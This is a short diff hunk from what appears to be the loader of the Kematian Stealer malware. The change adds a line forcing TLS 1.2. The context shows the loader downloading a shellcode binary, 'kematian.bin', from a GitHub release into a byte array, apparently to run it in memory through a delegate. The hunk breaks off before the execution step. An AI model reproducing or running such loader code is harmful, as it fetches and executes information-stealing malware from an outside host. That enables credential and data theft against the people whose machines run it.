@@ -11,6 +11,7 @@ function kematian {
         delegate void MemLoader();
 
         public static void Main() {
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             string url = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/releases/download/AutoBuild/kematian.bin";
             byte[] golangshc;
             using (WebClient client = new WebClient()) {
